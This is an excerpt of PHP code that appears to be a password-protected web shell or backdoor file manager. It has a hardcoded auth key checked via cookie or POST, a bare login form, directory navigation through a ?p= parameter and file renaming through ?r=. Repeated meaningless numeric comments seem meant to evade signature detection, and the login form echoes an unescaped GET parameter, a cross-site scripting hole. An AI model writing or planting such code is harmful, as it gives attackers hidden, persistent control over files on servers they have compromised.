...
$auth_key = "f1286e63b1b23203948a071478658e30";
...
$pass = false;
if (isset($_COOKIE['pw_name_68036'])) {
    if(($_COOKIE['pw_name_68036']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_68036'])) {
        if(($_POST['pw_name_68036']) == $auth_key) {
            setcookie("pw_name_68036", $_POST['pw_name_68036']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_68036' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728492483176040 1728492483174558 1728492483248848 1728492483307847
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728492483176040 1728492483174558 1728492483248848 1728492483307847
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728492483176040 1728492483174558 1728492483248848 1728492483307847
            $name = PATH . "/" . $_GET['r'];
